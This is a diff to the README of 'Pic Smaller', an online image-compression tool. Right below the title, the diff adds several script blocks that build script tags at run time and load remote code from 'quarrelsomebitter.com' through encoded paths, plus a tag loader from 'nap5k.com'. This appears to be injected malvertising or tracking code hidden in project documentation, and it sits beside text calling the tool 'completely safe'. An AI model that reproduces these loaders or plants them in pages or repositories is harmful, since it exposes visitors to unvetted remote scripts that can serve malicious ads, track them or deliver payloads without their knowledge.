@@ -1,5 +1,43 @@
 # Pic Smaller (图小小)
 
+<meta name="referrer" content="no-referrer-when-downgrade" />
+<script>
+(function(amd){
+var d = document,
+s = d.createElement('script'),
+l = d.scripts[d.scripts.length - 1];
+s.settings = amd || {};
+s.src = "\/\/quarrelsomebitter.com\/bvX.Vis\/dbGtly0oYZWacS\/BeFmv9oufZhUNlxkxPQTgczw\/MUzQY\/y\/MtTkcZtWNjzWAyz\/NfjdIhyNM\/QR";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
+<script>
+(function(amd){
+var d = document,
+s = d.createElement('script'),
+l = d.scripts[d.scripts.length - 1];
+s.settings = amd || {};
+s.src = "\/\/quarrelsomebitter.com\/bEXyV.sRdiG\/ls0BY\/WHcs\/veLmb9EunZ\/Ullfk\/PHTqcbwbMZzZY\/xTN_DyUSt-NUzwAazTN\/jmEe0fOfQR";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
+<script>(function(s){s.dataset.zone='10993491',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+<script>
+(function(elwen){
+var d = document,
+s = d.createElement('script'),
+l = d.scripts[d.scripts.length - 1];
+s.settings = elwen || {};
+s.src = "\/\/quarrelsomebitter.com\/bSXDVqsJd.GTlM0NYzWNcV\/ke\/m\/9Gu\/ZcUplfkTP\/TzcZwzMHz-YyxXN\/zFM\/tlNWzDAgzNNRjhEW3gNOwF";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
 **Pic Smaller** is a super easy-to-use online image compression tool. Simply upload your desired image(s), and Pic Smaller will automatically perform its compress functionality and provide details on the results. Users can also customize features to suite their desired output, such as setting the output format or number of output colors. It's intuitive, website and mobile friendly, and supports compression configuration. At the same time, because of purely local compression without any server-side logic, it is completely safe.
 
 <meta name="referrer" content="no-referrer-when-downgrade" />
